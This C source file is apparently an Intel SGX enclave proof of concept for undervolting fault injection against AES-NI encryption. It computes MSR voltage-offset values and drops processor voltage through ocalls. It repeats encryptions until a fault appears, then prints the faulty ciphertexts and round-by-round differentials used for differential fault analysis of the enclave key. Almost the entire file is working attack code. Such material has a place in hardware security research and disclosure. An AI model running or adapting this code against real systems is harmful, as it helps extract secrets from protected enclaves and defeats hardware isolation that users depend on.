#include <stdio.h>
#include <string.h>
#include <time.h>
#include <stdlib.h>
#include <stdint.h>
#include <smmintrin.h>
#include <wmmintrin.h>
#include <immintrin.h>
#include <immintrin.h>
#include "sgx_tcrypto.h"
#include "sgx_trts.h"
#include "encl_t.h" // for ocall

#define BUFLEN 2048

uint64_t plane0_return;
uint64_t plane2_return;
uint64_t plane0_offset;
uint64_t plane2_offset;

typedef unsigned int u32;

// The in-enclave secret key
static uint8_t key[16] = {0x0,0x1,0x2,0x3,0x4,0x5,0x6,0x7,0x8,0x9,0xa,0xb,0xc,0xd,0xe,0xf};
static __m128i key_schedule[20]; // the expanded key (local for thread safety)

#define AES_128_key_exp(k, rcon) aes_128_key_expansion(k, _mm_aeskeygenassist_si128(k, rcon))

#define DO_ENC_BLOCK(m, k)                  \
	do                                      \
	{                                       \
		m = _mm_xor_si128(m, k[0]);         \
		m = _mm_aesenc_si128(m, k[1]);      \
		m = _mm_aesenc_si128(m, k[2]);      \
		m = _mm_aesenc_si128(m, k[3]);      \
		m = _mm_aesenc_si128(m, k[4]);      \
		m = _mm_aesenc_si128(m, k[5]);      \
		m = _mm_aesenc_si128(m, k[6]);      \
		m = _mm_aesenc_si128(m, k[7]);      \
		m = _mm_aesenc_si128(m, k[8]);      \
		m = _mm_aesenc_si128(m, k[9]);      \
		m = _mm_aesenclast_si128(m, k[10]); \
	} while (0)

static __m128i aes_128_key_expansion(__m128i key, __m128i keygened)
{
	keygened = _mm_shuffle_epi32(keygened, _MM_SHUFFLE(3, 3, 3, 3));
	key = _mm_xor_si128(key, _mm_slli_si128(key, 4));
	key = _mm_xor_si128(key, _mm_slli_si128(key, 4));
	key = _mm_xor_si128(key, _mm_slli_si128(key, 4));
	return _mm_xor_si128(key, keygened);
}

static void aes128_load_key(uint8_t *enc_key, __m128i *key_schedule)
{
	key_schedule[0] = _mm_loadu_si128((const __m128i *)enc_key);
	key_schedule[1] = AES_128_key_exp(key_schedule[0], 0x01);
	key_schedule[2] = AES_128_key_exp(key_schedule[1], 0x02);
	key_schedule[3] = AES_128_key_exp(key_schedule[2], 0x04);
	key_schedule[4] = AES_128_key_exp(key_schedule[3], 0x08);
	key_schedule[5] = AES_128_key_exp(key_schedule[4], 0x10);
	key_schedule[6] = AES_128_key_exp(key_schedule[5], 0x20);
	key_schedule[7] = AES_128_key_exp(key_schedule[6], 0x40);
	key_schedule[8] = AES_128_key_exp(key_schedule[7], 0x80);
	key_schedule[9] = AES_128_key_exp(key_schedule[8], 0x1B);
	key_schedule[10] = AES_128_key_exp(key_schedule[9], 0x36);

	// generate decryption keys in reverse order.
	// k[10] is shared by last encryption and first decryption rounds
	// k[0] is shared by first encryption round and last decryption round (and is the original user key)
	// For some implementation reasons, decryption key schedule is NOT the encryption key schedule in reverse order
	key_schedule[11] = _mm_aesimc_si128(key_schedule[9]);
	key_schedule[12] = _mm_aesimc_si128(key_schedule[8]);
	key_schedule[13] = _mm_aesimc_si128(key_schedule[7]);
	key_schedule[14] = _mm_aesimc_si128(key_schedule[6]);
	key_schedule[15] = _mm_aesimc_si128(key_schedule[5]);
	key_schedule[16] = _mm_aesimc_si128(key_schedule[4]);
	key_schedule[17] = _mm_aesimc_si128(key_schedule[3]);
	key_schedule[18] = _mm_aesimc_si128(key_schedule[2]);
	key_schedule[19] = _mm_aesimc_si128(key_schedule[1]);
}
static __m128i aes128_enc(__m128i plaintext)
{
	uint8_t pt[16] = {0};
	uint8_t ct[16] = {0};
	__m128i m = plaintext;

	DO_ENC_BLOCK(m, key_schedule);

	_mm_storeu_si128((__m128i *)ct, m);

	return m;
}

static inline u32 rol(u32 x, int n)
{
	__asm__(
		"roll %%cl,%0"
		: "=r"(x)
		: "0"(x), "c"(n));
	return x;
}

bool vec_equal(__m256i a, __m256i b)
{
	__m256i pcmp = _mm256_cmpeq_epi32(a, b); // epi8 is fine too
	unsigned bitmask = _mm256_movemask_epi8(pcmp);
	return (bitmask == 0xffffffffU);
}

bool vec_equal_128(__m128i a, __m128i b)
{
	__m128i pcmp = _mm_cmpeq_epi32(a, b); // epi8 is fine too
	unsigned bitmask = _mm_movemask_epi8(pcmp);
	return (bitmask == 0xffffU);
}

volatile uint64_t not_used = 0xdead;
volatile __m256i var;

static void eprintf(const char *fmt, ...)
{
	char buf[1000] = {'\0'};
	va_list ap;
	va_start(ap, fmt);
	vsnprintf(buf, 1000, fmt, ap);
	va_end(ap);
	ocall_print_string(buf);
}

static void print_m128i(const char *s, __m128i x, const char *f)
{
	uint8_t xs[16] = {0};
	char final_string[33];
	char buf[3];

	_mm_storeu_si128((__m128i *)xs, x);

	for (int i = 0; i < 16; i++)
	{
		snprintf(buf, 3, "%02X", xs[i]);
		final_string[2 * i] = buf[0];
		final_string[2 * i + 1] = buf[1];
	}
	final_string[32] = 0;

	eprintf("%s%s%s", s, final_string, f);
}

static void aesdec_print_rounds(__m128i m, __m128i n)
{
	m = _mm_xor_si128(m, key_schedule[10 + 0]);
	n = _mm_xor_si128(n, key_schedule[10 + 0]);
	__m128i x = _mm_xor_si128(m,n);
	print_m128i("dec: ", m, "");
	print_m128i("", n, "");
	print_m128i("10: ", x, ".\n");

	for (int i=1; i < 10; i++)
	{
		m = _mm_aesdec_si128(m, key_schedule[10 + i]);
		n = _mm_aesdec_si128(n, key_schedule[10 + i]);
		x = _mm_xor_si128(m,n);
		print_m128i("dec: ", m, "");
		print_m128i("", n,"");
		char i_str[5]={0};
		snprintf(i_str,5 , "%02i: ", 10-i);
		print_m128i(i_str, x, ".\n");
	}

	m = _mm_aesdeclast_si128(m, key_schedule[0]);
	n = _mm_aesdeclast_si128(n, key_schedule[0]);
	x = _mm_xor_si128(m,n);
	print_m128i("dec: ", m, "");
	print_m128i("", n, "");
	print_m128i("00: ", x, ".\n");
	
}

uint64_t wrmsr_value(int64_t val, uint64_t plane)
{
	// -0.5 to deal with rounding issues
	val = (val * 1.024) - 0.5;
	val = 0xFFE00000 & ((val & 0xFFF) << 21);
	val = val | 0x8000001100000000;
	val = val | (plane << 40);
	return (uint64_t)val;
}


uint64_t fault_it(int iterations)
{
	int i = 0;

	__m128i correct_value;

	uint32_t b[16];
	uint32_t c[16];

	for (size_t j = 0; j < 4; j++)
	{
		unsigned randVal;
		_rdrand32_step(&randVal);
		b[j] = randVal;
		c[j] = 0;
	}

	__m128i plaintext = _mm_loadu_si128((__m128i *)b);

	__m128i result1;
	__m128i result2;

	result1 = _mm_loadu_si128((__m128i *)b);
	aes128_load_key(key, key_schedule);

	//////////////////
	// drop voltage //
	//////////////////
	ocall_voltage_change(plane0_offset);
	ocall_voltage_change(plane2_offset);

	do
	{
		i++;

		for (size_t j = 0; j < 4; j++)
		{
			unsigned randVal;
			_rdrand32_step(&randVal);
			b[j] = randVal;
		}
		plaintext = _mm_loadu_si128((__m128i *)b);

		result1 = aes128_enc(plaintext);
		result2 = aes128_enc(plaintext);

	} while (vec_equal_128(result1, result2) && i < iterations);

	////////////////////
	// return voltage //
	////////////////////
	ocall_voltage_change(plane0_return);
	ocall_voltage_change(plane2_return);



	if (!vec_equal_128(result1, result2))
	{
		print_m128i("plaintext: ", plaintext, "\n");
		print_m128i("ciphertext1: ", result1, "\n");
		print_m128i("ciphertext2: ", result2, "\n");
		eprintf(">>>>> INCORRECT ENCRYPTION <<<< \n");
		aesdec_print_rounds(result1, result2);
	}

	return 1;
}

void enclave_calculation(int iterations, int64_t offset)
{
	// calculate the unvervolting values to send to the msr 
	plane0_return = wrmsr_value(0, 0);
	plane2_return = wrmsr_value(0, 2);
	plane0_offset = wrmsr_value(offset, 0);
	plane2_offset = wrmsr_value(offset, 2);

	uint64_t return_val = fault_it(iterations);
}
